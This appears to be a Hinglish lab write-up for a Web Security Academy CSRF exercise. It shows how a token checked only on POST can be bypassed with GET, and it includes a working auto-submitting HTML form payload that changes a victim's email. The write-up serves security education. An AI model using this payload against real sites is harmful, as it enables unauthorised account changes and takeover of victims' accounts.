# ✅ Lab Ka Naam:

**CSRF where token validation depends on request method**

---

## 🔍 **Yeh lab humein kya sikhaata hai?**

Yeh site CSRF token use kar rahi hai — **lekin sirf POST requests ke liye**.

➡️ Agar tum **GET method** use karo to token ki **validation nahi hoti**
➡️ Aur yehi **server side ki badi bhool** hai — jisko hum exploit karenge 😈

---

# 🚀 A to Z Lab Solve Karne Ka Tareeqa

---

## 🔹 Step 1: Login and Capture Request

1. Lab open karo
2. Login karo using:

   ```
   Username: wiener  
   Password: peter
   ```
3. "My account" page jao
4. Email address koi new daal ke submit karo
   (example: `csrf@test.com`)

---

## 🔹 Step 2: Request ko Burp mein dhoondo

Burp > Proxy > HTTP History mein dekho:

Request something like this:

```
POST /my-account/change-email HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=xyz
csrf=HDSAKH123478
email=csrf@test.com
```

✅ Yeh POST request hai + `csrf` token bhi diya gaya hai

---

## 🔹 Step 3: CSRF token test karo (Repeater mein)

1. Is request ko **Repeater** mein bhejo
2. `csrf=` token ka value galat karo
3. Request bhejo

➡️ Server kahega: `Invalid CSRF token` — iska matlab POST request mein token required hai

---

## 🔹 Step 4: Request method ko GET banao

1. Repeater mein hi request pe right-click karo
2. Select: **Change request method → GET**

Yani ab banega:

```
GET /my-account/change-email?email=csrf@test.com&csrf=HDSAKH123478 HTTP/1.1
```

➡️ Isko bhejo

😱 OMG! Server ne email change kar diya bina token check kiye!

✅ Matlab: **GET request pe CSRF token validate nahi ho raha** → YANI VULNERABLE

---

## 🔹 Step 5: Ab Exploit HTML banao (GET request wala)

```html
<form action="https://your-lab-id.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@csrf123.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

⚠️ Make sure:

* `action="..."` mein tumhara **lab ka exact URL** ho
* `email` wiener\@... se different ho
  (warna lab solve nahi hoga)

---

## 🔹 Step 6: Exploit Server mein paste karo

1. Lab page pe "Go to exploit server" pe jao
2. Upar wala HTML code paste karo in **Body**
3. Click **Store**

---

## 🔹 Step 7: View aur Deliver

1. Pehle test karna ho to: **View exploit** dabao

   * Check karo kya tumhara email change ho gaya

2. Final step:

   * Email change karke **unique** email daalo jaisy sadas@asdas.com
   * Click **Deliver to victim**

✅ Lab solved message aayega:

```
🎉 Congratulations, you solved the lab!
```

---

# 💡 Kya Seekha Is Lab Se?

| Concept           | Explanation                                                           |
| ----------------- | --------------------------------------------------------------------- |
| CSRF token        | POST requests mein server validate kar raha tha                       |
| Weak defense      | GET requests pe server **token validate nahi kar raha**               |
| Exploit           | GET method se email silently change ho gaya                           |
| Real-world impact | Same bug agar bank transfer jese page pe ho to dangerous ho sakta hai |

---

### Summary:

* Server sochta hai sirf POST requests dangerous hoti hain — GET safe hai
* Humne GET request se email silently change kar diya
* Isliye hamesha **server ko har method pe validate karna chahiye**
